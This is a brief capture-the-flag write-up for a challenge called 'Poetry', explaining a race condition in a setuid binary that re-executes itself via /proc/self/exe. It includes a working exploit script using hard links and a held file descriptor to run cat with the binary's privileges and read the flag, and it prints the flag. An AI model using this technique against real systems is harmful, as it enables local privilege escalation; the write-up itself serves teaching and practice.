# Poetry 

CVE-2009-1894 problem. 

poetry binary call execv() syscall. and parameter is readed link for '/proc/self/exe'. And, it has 's' flag.

This link point to execute command. So, there is some race.

I make some link to original file, name exploit, after then replace 'exploit' to another binary. I can execute some binary for 'poetry' privilege!

https://blog.stalkr.net/2010/11/exec-race-condition-exploitations.html

I used exploit 3 at this blog

```
conn.sendline("cd /home/user")
# make hard link to vulnerable binary
conn.sendline("ln -f /home/poetry/poetry ./exploit")
# Save some information (including owner and setuid bit) about vulnerable binary
conn.sendline("exec 3< ./exploit")
# replace hard link to cat
conn.sendline("rm -f exploit")
conn.sendline("cp /bin/cat './exploit (deleted)'")

# execute it!
conn.sendline("exec /proc/$$/fd/3 /home/poetry/flag")
```

CTF{CV3-2009-1894}